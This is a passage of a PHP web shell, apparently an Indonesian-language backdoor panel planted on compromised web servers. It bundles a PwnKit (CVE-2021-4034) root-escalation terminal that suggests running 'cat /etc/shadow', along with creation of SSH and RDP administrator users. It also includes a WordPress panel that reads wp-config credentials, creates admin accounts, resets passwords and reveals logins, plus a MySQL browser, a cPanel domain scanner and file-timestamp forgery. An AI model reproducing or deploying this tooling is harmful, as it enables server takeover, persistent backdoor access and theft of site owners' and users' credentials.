<div class="oh"><h3><i class="fa-solid fa-shield-halved"></i> Auto Root (Privilege Escalation)</h3><a class="ox" href="?d=<?= hx($fungsi[0]()) ?>"><i class="fa-solid fa-xmark"></i></a></div>
<div class="oby">
<div style="background:var(--bg);border:1px solid var(--bd);border-radius:6px;padding:10px;margin-bottom:10px;font-size:12px;color:var(--tx2)">
<strong style="color:var(--or)">Apa itu Auto Root?</strong><br>
Fitur ini mencoba mendapatkan akses <strong style="color:var(--rd)">root</strong> menggunakan CVE-2021-4034 (PwnKit).<br>
Jika server vulnerable, kamu bisa menjalankan command sebagai root (uid=0).<br>
<strong>Syarat:</strong> Linux, kernel lama, pkexec (polkit) terpasang.<br>
<strong>Jika gagal:</strong> Server sudah di-patch atau arsitektur tidak didukung.
</div>
<textarea disabled><?php
$rootReady = ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit'));
if ($rootReady) {
    $response = trim($fungsi[11]('.mad-root')); $r_text = explode(" ", $response);
    if (strpos($r_text[0], "uid=0") !== false) {
        echo "[+] ROOT ACCESS AVAILABLE! Server vulnerable.\n";
        echo "[+] Current: " . trim(cmd('id')) . "\n";
        echo "[+] Pwnkit: " . $r_text[0] . "\n\n";
        if (isset($_POST['submit-root']) && !empty($_POST['root-terminal'])) {
            echo "root# " . $_POST['root-terminal'] . "\n";
            echo cmd('./pwnkit "' . $_POST['root-terminal'] . ' 2>&1"');
        } else { echo "Ketik command di bawah dan tekan Run.\nContoh: cat /etc/shadow, id, whoami\n"; }
    } else {
        echo "[-] Server TIDAK vulnerable terhadap PwnKit.\n";
        echo "[-] Output: " . $response . "\n\n";
        echo "=== OS Info ===\n";
        echo cmd('cat /etc/os-release') . "\n";
        echo "Kernel: " . cmd('uname -r') . "\n";
        echo "Arch: " . cmd('uname -m') . "\n\n";
        echo "=== Saran ===\n";
        echo "Coba cari exploit manual untuk kernel " . suggest_exploit() . "\n";
        echo "Referensi: searchsploit, exploit-db.com\n";
    }
} else {
    echo "[*] Downloading PwnKit binary dari GitHub...\n";
    echo "[*] Jika ini terus muncul, server mungkin memblokir koneksi keluar.\n\n";
    echo "=== Server Info ===\n";
    echo "OS: " . cmd('cat /etc/os-release 2>/dev/null | head -2') . "\n";
    echo "Kernel: " . cmd('uname -a') . "\n";
    echo "User: " . cmd('id') . "\n";
}
?></textarea>
<form action="" method="post"><div class="tr">
<input type="text" name="root-terminal" placeholder="<?= 'root@'.$_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?> (contoh: id, whoami, cat /etc/shadow)" autofocus>
<input type="submit" name="submit-root" value="Run" class="bp" style="padding:8px 18px">
</div></form>
</div></div></div>
<?php endif; ?>
 
<!-- WP PANEL -->
<div class="ov wov" id="wp-panel"><div class="ob wob">
<div class="oh"><h3><i class="fa-brands fa-wordpress"></i> WordPress Panel</h3><span class="ox" onclick="$('#wp-panel').removeClass('active')"><i class="fa-solid fa-xmark"></i></span></div>
<div class="oby" id="wp-content">
<div style="text-align:center;padding:40px;color:var(--tx2)"><i class="fa-solid fa-spinner fa-spin" style="font-size:20px"></i><p style="margin-top:10px">Scanning WordPress installations...</p></div>
</div>
</div></div>
 
<!-- Right-Click Context Menu -->
<div class="ctx" id="ctxMenu">
<a href="#" id="ctx-open"><i class="fa-solid fa-folder-open"></i> Open / Edit</a>
<a href="#" id="ctx-rename"><i class="fa-solid fa-pen"></i> Rename</a>
<a href="#" id="ctx-chmod"><i class="fa-solid fa-key"></i> Chmod</a>
<a href="#" id="ctx-download"><i class="fa-solid fa-download"></i> Download</a>
<hr>
<a href="#" id="ctx-lock"><i class="fa-solid fa-lock"></i> Auto-Lock</a>
<hr>
<a href="#" id="ctx-delete" style="color:var(--rd)"><i class="fa-solid fa-trash" style="color:var(--rd)"></i> Delete</a>
</div>

<script>
var _NP='<?= $_NONCE_PREFIX ?>';function _go(u){if(u.charAt(0)==='?'&&_NP&&u.indexOf(_NP)===-1)u='?'+_NP+u.substring(1);location=u;}
$(function(){if(_NP)$('a[href^="?"]').each(function(){var h=$(this).attr('href');if(h.indexOf(_NP)===-1)$(this).attr('href','?'+_NP+h.substring(1));});});
var ctxTarget='',ctxType='';
function showCtx(e,hex,type){e.preventDefault();e.stopPropagation();ctxTarget=hex;ctxType=type;
$('.ctx-active').removeClass('ctx-active');
$(e.currentTarget).addClass('ctx-active');
var m=$('#ctxMenu'),x=e.pageX,y=e.pageY;
if(x+200>$(window).width())x-=200;if(y+250>$(window).height()+$(window).scrollTop())y-=200;
m.css({left:x,top:y}).addClass('show');
$('#ctx-download').toggle(type==='file');
}
$(document).click(function(){$('#ctxMenu').removeClass('show');$('.ctx-active').removeClass('ctx-active');});
$(window).on('scroll',function(){$('#ctxMenu').removeClass('show');$('.ctx-active').removeClass('ctx-active');});
$('#ctxMenu a').on('click',function(e){e.stopPropagation();});
$('#ctx-open').click(function(e){e.preventDefault();
var d='<?= hx($fungsi[0]()) ?>';
if(ctxType==='dir')_go('?d='+d+'2f'+ctxTarget);
else _go('?d='+d+'&f='+ctxTarget);
});
$('#ctx-rename').click(function(e){e.preventDefault();_go('?d=<?= hx($fungsi[0]()) ?>&re='+ctxTarget);});
$('#ctx-chmod').click(function(e){e.preventDefault();
var row=$('.ctx-active').find('.pm');
if(row.length)inlineChmod(ctxTarget,row[0]);
else{_go('?d=<?= hx($fungsi[0]()) ?>&ch='+ctxTarget);}
});
$('#ctx-download').click(function(e){e.preventDefault();_go('?d=<?= hx($fungsi[0]()) ?>&don='+ctxTarget);});
$('#ctx-delete').click(function(e){e.preventDefault();
Swal.fire({title:'Delete?',text:'This cannot be undone.',icon:'warning',showCancelButton:true,confirmButtonColor:'#ef4444',cancelButtonColor:'#252b38',background:'#12161e',color:'#c5cdd8'}).then(function(r){
if(r.isConfirmed){var f=$('<form method="POST"><input name="check[]" value="'+decodeHex(ctxTarget)+'"><input name="gecko-select" value="delete"><input name="submit-action" value="1"></form>');
$('body').append(f);f.submit();}});
});
$('#ctx-lock').click(function(e){e.preventDefault();
var f=$('<form method="POST"><input name="lockfile" value="'+decodeHex(ctxTarget)+'"><input name="submit" value="1"></form>');
$('body').append(f);f.submit();});

function decodeHex(h){var s='';for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;}

// Sortable Columns
var sortDir={};
$('#ftable thead th[data-sort]').click(function(){
var col=$(this).data('sort'),tb=$('#ftable tbody'),rows=tb.find('tr').get();
sortDir[col]=!sortDir[col];
rows.sort(function(a,b){
var va,vb;
if(col==='name'){va=$(a).data('name');vb=$(b).data('name');
var ta=$(a).data('type'),tb2=$(b).data('type');
if(ta!==tb2)return ta==='dir'?-1:1;
return sortDir[col]?va.localeCompare(vb):vb.localeCompare(va);}
if(col==='size'){va=parseInt($(a).data('size'))||0;vb=parseInt($(b).data('size'))||0;}
if(col==='date'){va=parseInt($(a).data('date'))||0;vb=parseInt($(b).data('date'))||0;}
if(col==='perm'){va=$(a).data('perm')||'';vb=$(b).data('perm')||'';}
if(col==='size'||col==='date')return sortDir[col]?va-vb:vb-va;
return sortDir[col]?String(va).localeCompare(String(vb)):String(vb).localeCompare(String(va));
});
$.each(rows,function(i,r){tb.append(r);});
$('#ftable thead th .si-arr i').attr('class','fa-solid fa-sort');
$(this).find('.si-arr i').attr('class','fa-solid fa-sort-'+(sortDir[col]?'up':'down'));
});

// Inline Chmod (AJAX)
function inlineChmod(hex,el){
var cur=$(el).text().trim();
Swal.fire({title:'Chmod',input:'text',inputValue:cur,inputPlaceholder:'e.g. 0755',showCancelButton:true,confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8'}).then(function(r){
if(!r.isConfirmed||!r.value)return;
$(el).html('<i class="fa-solid fa-spinner fa-spin"></i>');
$.post('',{bm_action:'chmod',target:decodeHex(hex),perm:r.value},function(d){
if(d.ok){$(el).text(d.perm);Swal.fire({icon:'success',title:'Chmod OK',text:d.msg,timer:1500,showConfirmButton:false,background:'#12161e',color:'#c5cdd8'});}
else{$(el).text(cur);Swal.fire({icon:'error',title:'Error',text:d.msg,background:'#12161e',color:'#c5cdd8'});}
},'json').fail(function(){$(el).text(cur);});
});}

// Inline Date Edit (AJAX)
function inlineDate(hex,el){
var cur=$(el).text().trim();
Swal.fire({title:'Change Date',input:'text',inputValue:cur,inputPlaceholder:'dd MMM YYYY HH:mm (e.g. 01 Jan 2025 12:00)',showCancelButton:true,confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8',
html:'<div style="font-size:11px;color:#7a8494;margin-bottom:8px">Format: 01 Jan 2025 12:00</div>'}).then(function(r){
if(!r.isConfirmed||!r.value)return;
$(el).html('<i class="fa-solid fa-spinner fa-spin" style="font-size:11px"></i>');
$.post('',{bm_action:'touch',target:decodeHex(hex),timestamp:r.value},function(d){
if(d.ok){$(el).text(d.date);Swal.fire({icon:'success',title:'Date Updated',text:d.msg,timer:1500,showConfirmButton:false,background:'#12161e',color:'#c5cdd8'});}
else{$(el).text(cur);Swal.fire({icon:'error',title:'Error',text:d.msg,background:'#12161e',color:'#c5cdd8'});}
},'json').fail(function(){$(el).text(cur);});
});}

$(document).ready(function(){
$('#create_folder').click(function(e){e.preventDefault();$('#modal-generic').addClass('active');$('#modal-title').html('<i class="fa-solid fa-folder-plus"></i> Create Folder');$('#modal-input').html('<input type="text" name="create_folder" placeholder="Folder name">');});
$('#create_file').click(function(e){e.preventDefault();$('#modal-generic').addClass('active');$('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i> Create File');$('#modal-input').html('<input type="text" name="create_file" placeholder="File name">');});
$('#lock-file').click(function(e){e.preventDefault();$('#modal-generic').addClass('active');$('#modal-title').html('<i class="fa-solid fa-lock"></i> Lock File');
$('#modal-input').html('<div style="position:relative"><input type="text" name="lockfile" id="lockfile-input" placeholder="Full path (e.g. <?= addslashes($fungsi[0]()) ?>/file.php)" value="<?= addslashes($fungsi[0]()) ?>/" autocomplete="off" style="width:100%"><div id="lockfile-ac" style="position:absolute;top:100%;left:0;right:0;background:var(--sf);border:1px solid var(--bd);border-radius:0 0 6px 6px;max-height:200px;overflow-y:auto;display:none;z-index:200;font-size:12px"></div></div>');
$('#lockfile-input').on('input',function(){var v=$(this).val(),dir=v.substring(0,v.lastIndexOf('/')+1),prefix=v.substring(v.lastIndexOf('/')+1);
$.post('',{bm_action:'ls',path:dir,prefix:prefix},function(d){
if(!d.ok||!d.items.length){$('#lockfile-ac').hide();return;}
var h='';d.items.forEach(function(f){h+='<div style="padding:5px 10px;cursor:pointer;border-bottom:1px solid var(--bd);color:var(--tx)" class="lf-item" data-path="'+f.path+(f.is_dir?'/':'')+'"><i class="fa-solid '+(f.is_dir?'fa-folder" style="color:var(--or)':'fa-file" style="color:var(--tx2)')+'"></i> '+f.name+'</div>';});
$('#lockfile-ac').html(h).show();
},'json');});
$(document).on('click','.lf-item',function(){$('#lockfile-input').val($(this).data('path')).trigger('input');$('#lockfile-ac').hide();});
});
$('#create-rdp').click(function(e){e.preventDefault();
var isWin=<?= stristr(PHP_OS,'WIN')?'true':'false' ?>;
var title=isWin?'<i class="fa-solid fa-display"></i> Create RDP User':'<i class="fa-solid fa-user-plus"></i> Create SSH User';
var hint=isWin?'User akan ditambahkan ke Administrators group':'User Linux baru dengan akses SSH (useradd + chpasswd)';
$('#modal-generic').addClass('active');$('#modal-title').html(title);
$('#modal-input').html('<p style="font-size:11px;color:var(--tx2);margin-bottom:8px">'+hint+'</p><input type="text" id="ssh-user" placeholder="Username"><input type="password" id="ssh-pass" placeholder="Password" style="margin-top:8px"><div id="ssh-result" style="margin-top:8px;font-size:12px"></div>');
$('#modal-generic form').off('submit').on('submit',function(ev){ev.preventDefault();
var u=$('#ssh-user').val(),p=$('#ssh-pass').val();
if(!u||!p){$('#ssh-result').html('<span style="color:var(--rd)">Username & password required</span>');return;}
$('#ssh-result').html('<i class="fa-solid fa-spinner fa-spin"></i> Creating...');
$.post('',{bm_action:'add_ssh_user',ssh_user:u,ssh_pass:p},function(d){
var msg=d.msg;if(d.type==='ssh'&&d.host)msg+='<br><code style="color:var(--gn);font-size:11px">ssh '+u+'@'+d.host+'</code>';
$('#ssh-result').html('<span style="color:'+(d.ok?'var(--gn)':'var(--rd)')+'">'+msg+'</span>');
},'json');});
});
$('#close-modal').click(function(e){e.preventDefault();$('#modal-generic').removeClass('active');});
$('#close-editor,#close-editor-btn').click(function(e){e.preventDefault();$('.eov').removeClass('active');});
$('.close-btn-s').click(function(e){e.preventDefault();$(this).closest('.ov').removeClass('active');});
var mt=document.getElementById("code");
if(mt){CodeMirror.fromTextArea(mt,{mode:"xml",lineNumbers:true,theme:"ayu-mirage",extraKeys:{"Ctrl-Space":"autocomplete"},hintOptions:{completeSingle:false}});}

// WP Panel
$('#btn-wp-panel').click(function(e){e.preventDefault();$('#wp-panel').addClass('active');
$.post('',{pb_wp_action:'scan'},function(d){
if(!d.ok||!d.sites.length){$('#wp-content').html('<div style="text-align:center;padding:40px;color:var(--rd)"><i class="fa-solid fa-xmark" style="font-size:24px"></i><p style="margin-top:10px">No WordPress installation detected</p></div>');return;}
var h='';d.sites.forEach(function(s){var k=btoa(s.config_path).replace(/[^a-zA-Z0-9]/g,'');
h+='<div class="wc"><h4><i class="fa-brands fa-wordpress"></i> '+(s.site_url||s.wp_root)+'</h4>';
h+='<div class="wg"><div>DB Host: <span>'+(s.DB_HOST||'-')+'</span></div><div>DB Name: <span>'+(s.DB_NAME||'-')+'</span></div><div>DB User: <span>'+(s.DB_USER||'-')+'</span></div><div>Prefix: <span>'+(s.prefix||'wp_')+'</span></div><div>Users: <span>'+(s.user_count||0)+'</span></div><div>Status: <span style="color:'+(s.db_ok?'var(--gn)':'var(--rd)')+';">'+(s.db_ok?'Connected':'Failed')+'</span></div></div>';
if(s.db_ok){h+='<button class="tb tb-a wlu" data-cfg="'+s.config_path+'"><i class="fa-solid fa-users"></i> Load Users</button> ';
h+='<button class="tb wct" data-cfg="'+s.config_path+'"><i class="fa-solid fa-user-plus"></i> Create Admin</button>';
h+='<div id="u-'+k+'"></div>';
h+='<div class="wcf" id="c-'+k+'"><input type="text" placeholder="Username" class="cu"><input type="text" placeholder="Password" class="cp"><button class="tb tb-a wdc" data-cfg="'+s.config_path+'" style="margin-top:6px">Create</button><div class="wm"></div></div>';}
h+='</div>';});$('#wp-content').html(h);},'json');});
$(document).on('click','.wlu',function(){var c=$(this).data('cfg'),k='u-'+btoa(c).replace(/[^a-zA-Z0-9]/g,''),$t=$('#'+k);
$t.html('<div style="padding:10px;color:var(--tx2)"><i class="fa-solid fa-spinner fa-spin"></i> Loading...</div>');
$.post('',{pb_wp_action:'users',wp_config:c},function(d){if(!d.ok){$t.html('<div class="wm err">'+d.msg+'</div>');return;}
var t='<table class="wt"><thead><tr><th>ID</th><th>Login</th><th>Email</th><th>Role</th><th>Registered</th><th>Actions</th></tr></thead><tbody>';
d.users.forEach(function(u){var rc=u.role==='administrator'?'ra':'ro';
t+='<tr><td>'+u.ID+'</td><td>'+u.user_login+'</td><td>'+u.user_email+'</td><td class="'+rc+'">'+u.role+'</td><td>'+u.user_registered+'</td><td>';
t+='<button class="wa wa-r wrp" data-cfg="'+c+'" data-uid="'+u.ID+'" title="Reset Password"><i class="fa-solid fa-key"></i></button>';
t+='<button class="wa wa-g wla" data-cfg="'+c+'" data-uid="'+u.ID+'" title="Get Login"><i class="fa-solid fa-right-to-bracket"></i></button>';
t+='</td></tr>';});t+='</tbody></table>';$t.html(t);},'json');});
$(document).on('click','.wct',function(){var c=$(this).data('cfg'),k='c-'+btoa(c).replace(/[^a-zA-Z0-9]/g,'');$('#'+k).toggle();});
$(document).on('click','.wdc',function(){var c=$(this).data('cfg'),$p=$(this).parent(),u=$p.find('.cu').val(),pw=$p.find('.cp').val(),$s=$p.find('.wm');
$.post('',{pb_wp_action:'create_admin',wp_config:c,username:u,password:pw},function(d){$s.show().removeClass('ok err').addClass(d.ok?'ok':'err').text(d.msg);},'json');});
$(document).on('click','.wrp',function(){var c=$(this).data('cfg'),uid=$(this).data('uid');
Swal.fire({title:'New Password',input:'text',inputValue:'Admin@123',showCancelButton:true,confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8'}).then(function(r){
if(!r.isConfirmed)return;$.post('',{pb_wp_action:'reset_pass',wp_config:c,uid:uid,newpass:r.value},function(d){
Swal.fire({icon:d.ok?'success':'error',title:d.ok?'Done':'Error',text:d.msg,confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8'});
},'json');});});
$(document).on('click','.wla',function(){var c=$(this).data('cfg'),uid=$(this).data('uid');
$.post('',{pb_wp_action:'login_url',wp_config:c,uid:uid},function(d){
if(d.ok){Swal.fire({icon:'success',title:'Login Info',html:'<div style="text-align:left;font-size:12px;font-family:monospace"><strong>User:</strong> '+d.login+'<br><strong>Pass:</strong> '+d.password+'<br><strong>URL:</strong> <a href="'+d.wp_login+'" target="_blank" style="color:#2d7ff9">'+d.wp_login+'</a></div>',confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8'});}
else{Swal.fire({icon:'error',title:'Error',text:d.msg,confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8'});}
},'json');});

// MySQL Browser (bind event)
$('#btn-mysql').click(function(e){e.preventDefault();$('#mysql-panel').addClass('active');mysqlAutoDetect();});
// Active Domains Scanner (bind event)
$('#btn-domains').click(function(e){e.preventDefault();$('#domains-panel').addClass('active');});

});
// === GLOBAL FUNCTIONS (accessible from inline onclick) ===

function mysqlAutoDetect(){
$('#mysql-content').html('<div style="color:var(--tx2)"><i class="fa-solid fa-spinner fa-spin"></i> Auto-detecting...</div>');
$.post('',{pb_wp_action:'scan'},function(d){
if(d.ok&&d.sites.length){var s=d.sites[0];
$('#db-host').val(s.DB_HOST||'localhost');$('#db-user').val(s.DB_USER||'');$('#db-pass').val(s.DB_PASSWORD||'');$('#db-name').val(s.DB_NAME||'');
$('#mysql-content').html('<div style="color:var(--gn);margin-bottom:8px"><i class="fa-solid fa-check"></i> Auto-detected from: '+s.config_path+'</div>');
mysqlConnect();
}else{$('#mysql-content').html('<div style="color:var(--or)">No wp-config.php found. Enter manually.</div>');}
},'json');}

function mysqlConnect(){
var h=$('#db-host').val()||'localhost',u=$('#db-user').val(),p=$('#db-pass').val(),n=$('#db-name').val();
if(!u){$('#mysql-content').html('<div style="color:var(--rd)">DB User required.</div>');return;}
$('#mysql-content').html('<div style="color:var(--tx2)"><i class="fa-solid fa-spinner fa-spin"></i> Connecting...</div>');
$.post('',{bm_mysql:'connect',dbhost:h,dbuser:u,dbpass:p,dbname:n},function(d){
if(!d.ok){$('#mysql-content').html('<div style="color:var(--rd)"><i class="fa-solid fa-xmark"></i> '+d.msg+'</div>');return;}
if(d.tables)showTables(d.tables,d.db);
else if(d.databases)showDatabases(d.databases);
},'json').fail(function(x,s,e){$('#mysql-content').html('<div style="color:var(--rd)">AJAX Error: '+e+'</div>');});}

function showDatabases(dbs){
var t='<h4 style="color:#fff;margin-bottom:8px">Databases ('+dbs.length+')</h4>';
t+='<div style="max-height:300px;overflow-y:auto;border:1px solid var(--bd);border-radius:6px"><table class="wt" style="margin:0"><thead><tr><th>#</th><th>Database Name</th></tr></thead><tbody>';
dbs.forEach(function(db,i){t+='<tr style="cursor:pointer" onclick="mysqlSelectDB(\''+db+'\')"><td style="color:var(--tx2)">'+(i+1)+'</td><td style="font-family:var(--mn)">'+db+'</td></tr>';});
t+='</tbody></table></div>';$('#mysql-content').html(t);}

function mysqlSelectDB(db){$('#db-name').val(db);mysqlConnect();}

var _currentTable='';
function showTables(tables,db){
var t='<h4 style="color:#fff;margin-bottom:10px"><i class="fa-solid fa-database"></i> '+db+' <span style="color:var(--tx2);font-size:11px;font-weight:400">('+tables.length+' tables)</span></h4>';
// SQL Query Box
t+='<div style="margin-bottom:10px;border:1px solid var(--bd);border-radius:6px;padding:8px;background:var(--bg)">';
t+='<textarea id="sql-query" style="width:100%;height:50px;background:var(--bg);color:var(--gn);border:1px solid var(--bd);border-radius:4px;padding:6px 8px;font-family:var(--mn);font-size:12px;resize:vertical;outline:none" placeholder="SELECT * FROM table_name WHERE ..."></textarea>';
t+='<div style="display:flex;gap:6px;margin-top:6px"><button class="bp" style="padding:5px 14px;font-size:11px" onclick="mysqlRunSQL()"><i class="fa-solid fa-play"></i> Run SQL</button>';
t+='<span style="color:var(--tx2);font-size:10px;line-height:28px">Tulis query SQL lalu klik Run. SELECT/SHOW/DESCRIBE = tampilkan hasil. INSERT/UPDATE/DELETE = eksekusi.</span></div></div>';
// Layout: table list + data
t+='<div style="display:flex;gap:10px">';
t+='<div style="width:240px;max-height:350px;overflow-y:auto;border:1px solid var(--bd);border-radius:6px;flex-shrink:0">';
t+='<table class="wt" style="margin:0"><thead><tr><th style="position:sticky;top:0;background:var(--sf2);z-index:1">#</th><th style="position:sticky;top:0;background:var(--sf2);z-index:1">Table</th></tr></thead><tbody>';
tables.forEach(function(tb,i){t+='<tr style="cursor:pointer" onclick="mysqlBrowse(\''+tb+'\',0);$(\'#tbl-list tr\').css(\'background\',\'\');$(this).css(\'background\',\'rgba(45,127,249,.12)\')" id="tbl-list">';
t+='<td style="color:var(--tx2);width:28px">'+(i+1)+'</td><td style="font-family:var(--mn);font-size:11px">'+tb+'</td></tr>';});
t+='</tbody></table></div>';
t+='<div style="flex:1;min-width:0" id="mysql-table-data"><div style="color:var(--tx2);padding:20px;text-align:center;font-size:12px"><i class="fa-solid fa-arrow-left"></i> Klik tabel atau tulis SQL query</div></div>';
t+='</div>';$('#mysql-content').html(t);}

function mysqlBrowse(table,offset){
_currentTable=table;
$('#mysql-table-data').html('<div style="color:var(--tx2);padding:10px"><i class="fa-solid fa-spinner fa-spin"></i> Loading '+table+'...</div>');
$.post('',{bm_mysql:'browse',dbhost:$('#db-host').val(),dbuser:$('#db-user').val(),dbpass:$('#db-pass').val(),dbname:$('#db-name').val(),table:table,offset:offset},function(d){
if(!d.ok){$('#mysql-table-data').html('<div style="color:var(--rd)">'+d.msg+'</div>');return;}
renderTableData(d,table,offset);
},'json').fail(function(x,s,e){$('#mysql-table-data').html('<div style="color:var(--rd)">AJAX Error: '+e+'</div>');});}

var _browseData=null,_browseOffset=0;
function renderTableData(d,table,offset){
_browseData=d;_browseOffset=offset;
var t='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;flex-wrap:wrap;gap:4px">';
t+='<strong style="color:#fff;font-size:12px">'+table+' <span style="color:var(--tx2);font-weight:400">('+d.total+' rows)</span></strong>';
t+='<div style="display:flex;gap:4px;align-items:center">';
if(offset>0)t+='<button class="tb" style="font-size:10px" onclick="mysqlBrowse(\''+table+'\','+(offset-50)+')"><i class="fa-solid fa-chevron-left"></i> Prev</button>';
t+='<span style="font-size:10px;color:var(--tx2)">'+(offset+1)+'-'+Math.min(offset+50,d.total)+'</span>';
if(offset+50<d.total)t+='<button class="tb" style="font-size:10px" onclick="mysqlBrowse(\''+table+'\','+(offset+50)+')">Next <i class="fa-solid fa-chevron-right"></i></button>';
t+='</div></div>';
if(!d.columns||!d.columns.length){t+='<div style="color:var(--tx2);padding:10px">Empty table</div>';$('#mysql-table-data').html(t);return;}
t+='<div style="overflow:auto;max-height:340px;border:1px solid var(--bd);border-radius:4px"><table class="wt" style="margin:0;font-size:10px"><thead><tr>';
d.columns.forEach(function(c){t+='<th style="position:sticky;top:0;background:var(--sf2);z-index:1;white-space:nowrap">'+c+'</th>';});
t+='</tr></thead><tbody>';
d.rows.forEach(function(r,ri){t+='<tr>';d.columns.forEach(function(c){
var v=r[c],raw=v,disp='';
if(v===null){disp='<span style="color:var(--tx2);font-style:italic">NULL</span>';}
else{disp=String(v);if(disp.length>60)disp='<span title="'+disp.replace(/"/g,'&quot;')+'">'+disp.substring(0,60)+'...</span>';}
t+='<td style="white-space:nowrap;max-width:200px;overflow:hidden;text-overflow:ellipsis;cursor:pointer" onclick="mysqlEditCell('+ri+',\''+c.replace(/'/g,"\\'")+'\')" title="Click to edit">'+disp+'</td>';});t+='</tr>';});
t+='</tbody></table></div>';$('#mysql-table-data').html(t);}

function mysqlEditCell(rowIdx,col){
if(!_browseData||!_browseData.rows[rowIdx])return;
var row=_browseData.rows[rowIdx],pk=_browseData.pk||_browseData.columns[0],pkVal=row[pk];
var curVal=row[col];if(curVal===null)curVal='';
var table=_browseData.table||_currentTable;
Swal.fire({title:'Edit: '+col,input:'textarea',inputValue:String(curVal),inputPlaceholder:'Value (leave empty for empty string)',
html:'<div style="font-size:11px;color:#7a8494;margin-bottom:4px">Table: <b>'+table+'</b> | WHERE '+pk+' = '+pkVal+'</div>',
showCancelButton:true,showDenyButton:true,denyButtonText:'Set NULL',denyButtonColor:'#6b7280',confirmButtonText:'Save',confirmButtonColor:'#2d7ff9',background:'#12161e',color:'#c5cdd8',
customClass:{input:'swal2-textarea-sm'}}).then(function(r){
if(r.isDenied){
var sql="UPDATE `"+table+"` SET `"+col+"` = NULL WHERE `"+pk+"` = '"+String(pkVal).replace(/'/g,"\\'")+"' LIMIT 1";
mysqlExecEdit(sql,table);
}else if(r.isConfirmed){
var newVal=r.value;
var sql="UPDATE `"+table+"` SET `"+col+"` = '"+newVal.replace(/'/g,"\\'")+"' WHERE `"+pk+"` = '"+String(pkVal).replace(/'/g,"\\'")+"' LIMIT 1";
mysqlExecEdit(sql,table);
}});}

function mysqlExecEdit(sql,table){
$.post('',{bm_mysql:'run_sql',dbhost:$('#db-host').val(),dbuser:$('#db-user').val(),dbpass:$('#db-pass').val(),dbname:$('#db-name').val(),sql:sql},function(d){
if(!d.ok){Swal.fire({icon:'error',title:'Error',text:d.msg,background:'#12161e',color:'#c5cdd8'});return;}
Swal.fire({icon:'success',title:'Updated',text:d.msg,timer:1200,showConfirmButton:false,background:'#12161e',color:'#c5cdd8'});
mysqlBrowse(table,_browseOffset);
},'json').fail(function(x,s,e){Swal.fire({icon:'error',title:'AJAX Error',text:e,background:'#12161e',color:'#c5cdd8'});});}

function mysqlRunSQL(){
var sql=$('#sql-query').val();if(!sql){return;}
$('#mysql-table-data').html('<div style="color:var(--tx2);padding:10px"><i class="fa-solid fa-spinner fa-spin"></i> Executing query...</div>');
$.post('',{bm_mysql:'run_sql',dbhost:$('#db-host').val(),dbuser:$('#db-user').val(),dbpass:$('#db-pass').val(),dbname:$('#db-name').val(),sql:sql},function(d){
if(!d.ok){$('#mysql-table-data').html('<div style="color:var(--rd);padding:10px;font-family:var(--mn);font-size:12px"><i class="fa-solid fa-xmark"></i> '+d.msg+'</div>');return;}
if(d.type==='select'){renderTableData(d,'SQL Result',0);}
else{$('#mysql-table-data').html('<div style="color:var(--gn);padding:10px;font-size:12px"><i class="fa-solid fa-check"></i> '+d.msg+'</div>');
if(_currentTable)setTimeout(function(){mysqlBrowse(_currentTable,0);},800);}
},'json').fail(function(x,s,e){$('#mysql-table-data').html('<div style="color:var(--rd);padding:10px">AJAX Error: '+e+'</div>');});}

function scanDomains(){
$('#domains-content').html('<div style="text-align:center;padding:40px;color:var(--tx2)"><i class="fa-solid fa-spinner fa-spin" style="font-size:28px;color:var(--ac)"></i><p style="margin-top:14px;font-size:14px;color:#fff">Scanning domains...</p><p style="font-size:12px;margin-top:6px">Membaca: /etc/localdomains, /etc/domainips, cPanel configs, Apache/Nginx vhosts</p><p style="font-size:11px;margin-top:4px;color:var(--or)">Proses ini bisa memakan 1-2 menit jika banyak domain</p></div>');
$.ajax({url:'',type:'POST',data:{bm_action:'scan_domains'},dataType:'json',timeout:150000,
success:function(d){
if(!d.ok){$('#domains-content').html('<div style="color:var(--rd);padding:20px;text-align:center"><i class="fa-solid fa-xmark" style="font-size:20px"></i><p style="margin-top:8px">'+(d.msg||'Unknown error')+'</p></div>');return;}
if(!d.domains||!d.domains.length){$('#domains-content').html('<div style="text-align:center;padding:30px"><i class="fa-solid fa-circle-exclamation" style="font-size:24px;color:var(--or)"></i><p style="margin-top:10px;color:var(--or);font-size:13px">Tidak ada domain ditemukan</p><p style="font-size:11px;color:var(--tx2);margin-top:6px">Server mungkin bukan cPanel atau config tidak bisa diakses</p></div>');return;}
var active=0,redir=0,fail=0;
d.domains.forEach(function(dm){if(dm.status==='Active')active++;else if(dm.status==='Redirect')redir++;else fail++;});
var t='<div style="display:flex;gap:16px;margin-bottom:12px;font-size:12px;flex-wrap:wrap">';
t+='<span style="color:var(--tx2)">Total: <strong style="color:#fff">'+d.total+'</strong></span>';
t+='<span style="color:var(--gn)">Active: '+active+'</span>';
t+='<span style="color:var(--or)">Redirect: '+redir+'</span>';
t+='<span style="color:var(--rd)">Failed: '+fail+'</span></div>';
t+='<div style="max-height:400px;overflow-y:auto;border:1px solid var(--bd);border-radius:6px"><table class="wt" style="margin:0"><thead><tr><th style="position:sticky;top:0;background:var(--sf2);z-index:1;width:30px">#</th><th style="position:sticky;top:0;background:var(--sf2);z-index:1">Domain</th><th style="position:sticky;top:0;background:var(--sf2);z-index:1;width:80px">CMS</th><th style="position:sticky;top:0;background:var(--sf2);z-index:1;width:80px">Status</th></tr></thead><tbody>';
d.domains.forEach(function(dm,i){
var sc='var(--tx2)';
if(dm.status==='Active')sc='var(--gn)';else if(dm.status==='Redirect')sc='var(--or)';else if(dm.status==='Forbidden'||dm.status==='Not Found'||dm.status==='Error'||dm.status==='Timeout'||dm.status==='No Response')sc='var(--rd)';
var cc='color:var(--tx2)';if(dm.cms==='WordPress')cc='color:var(--ac)';else if(dm.cms==='Joomla')cc='color:var(--or)';else if(dm.cms==='Laravel')cc='color:var(--rd)';else if(dm.cms==='OJS')cc='color:var(--gn)';
